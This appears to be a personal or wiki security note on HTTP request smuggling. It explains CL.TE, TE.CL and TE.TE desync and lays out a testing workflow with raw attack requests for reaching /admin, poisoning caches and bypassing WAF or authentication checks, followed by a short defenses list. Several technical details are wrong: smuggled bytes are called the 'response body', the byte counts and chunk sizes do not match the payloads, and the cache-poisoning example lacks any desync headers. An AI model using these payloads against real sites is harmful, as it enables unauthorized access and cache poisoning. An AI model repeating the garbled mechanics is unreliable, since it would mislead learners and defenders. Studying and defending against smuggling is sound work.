#webapplications

HTTP request smuggling exploits disagreement between a front-end proxy (load balancer, WAF, API gateway) and a back-end server on where one HTTP request ends and the next begins. When they disagree, bytes meant to be part of the response body get reinterpreted as the start of a new request.

## How it works

**The setup:**
- Client sends 1 request
- Front-end proxy reads it one way (e.g., using `Content-Length`)
- Back-end server reads it another way (e.g., using `Transfer-Encoding`)
- Bytes the front-end thought were the *response body* become the back-end's next *request line*

**Example:**
```
POST / HTTP/1.1
Host: victim.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: victim.com
```

1. **Front-end sees:** "Content-Length: 13" → reads 13 bytes as body → `0\r\n\r\nGET` (ends request normally)
2. **Back-end sees:** "Transfer-Encoding: chunked" → reads chunks → `0` chunk (end marker) → next bytes are a new request
3. **Back-end processes:** `GET /admin HTTP/1.1` as a real request

## CL.TE vs TE.CL vs TE.TE

| Type | Front-end uses | Back-end uses | Attack |
| --- | --- | --- | --- |
| **CL.TE** | Content-Length | Transfer-Encoding: chunked | Append chunked request that front-end doesn't see |
| **TE.CL** | Transfer-Encoding: chunked | Content-Length | Inject Content-Length that front-end ignores |
| **TE.TE** | Transfer-Encoding (parsed one way) | Transfer-Encoding (parsed another way) | Exploit parsing differences |

## Testing workflow

### Step 1: Identify the target
- Any multi-tier setup: load balancer + app server, CDN + origin, WAF + application
- Test with timing: does a request hang (back-end waiting for more bytes)?

### Step 2: Send a desynchronizing request

**CL.TE test:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

- Front-end reads 6 bytes (`0\r\n\r\n`) and sends the response
- Back-end expects chunked, reads `0` chunk marker, treats `X` as start of next request
- Look for an error when back-end tries to parse `X` as a request line

**TE.CL test:**
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

5c
SMUGGLED_REQUEST_HERE
0

```

- Front-end reads chunked, passes entire thing to back-end
- Back-end uses Content-Length, reads 3 bytes, leaves rest for next request
- Back-end tries to parse leftover as new request

### Step 3: Escalate to cache poisoning or request-line injection

**Cache poison (if there's a shared cache):**
```http
GET /static.js HTTP/1.1
Host: target.com
...

POST /login HTTP/1.1
Host: target.com
```

1. First request asks for `static.js`
2. Smuggled request (POST to `/login`) is processed by back-end
3. Response to `/login` is cached under the key `/static.js`
4. All subsequent requests for `static.js` get the login form (or worse)

**Inject a malicious request line:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 49
Transfer-Encoding: chunked

0

GET /admin?user=attacker HTTP/1.1
Host: target.com
```

The back-end processes `GET /admin?user=attacker` as a second request within the same connection, bypassing WAFs or authentication checks that operate per-request.

## Why it's hard to detect

1. **Timing:** The attack takes multiple requests to manifest (legitimate request + smuggled request)
2. **Logs:** Each layer logs from its own perspective — front-end log shows normal request, back-end log shows the injected part
3. **Validation layers:** WAF might validate the front-end's view (clean), but back-end executes the hidden request
4. **Caching:** If a cache layer is involved, the poisoned response may be served to innocent users

## Defenses

1. **Disable Transfer-Encoding on front-end** if not needed (use Content-Length only)
2. **Ensure front-end and back-end agree** on request parsing rules
3. **Use HTTP/2 internally** — HTTP/2 framing eliminates ambiguity around request boundaries
4. **Normalize request headers:** front-end rejects ambiguous requests (both CL and TE, conflicting values)
5. **Add unique tokens per request:** WAF can track and re-validate on the back-end

**Example remediation:**
```
Front-end policy:
- If both Content-Length and Transfer-Encoding are present → reject 400
- Normalize chunked encoding (unwrap chunks, replace with Content-Length)
- Pass normalized request to back-end
```

---

**See also:**
- PortSwigger: [HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- OWASP: Request Smuggling
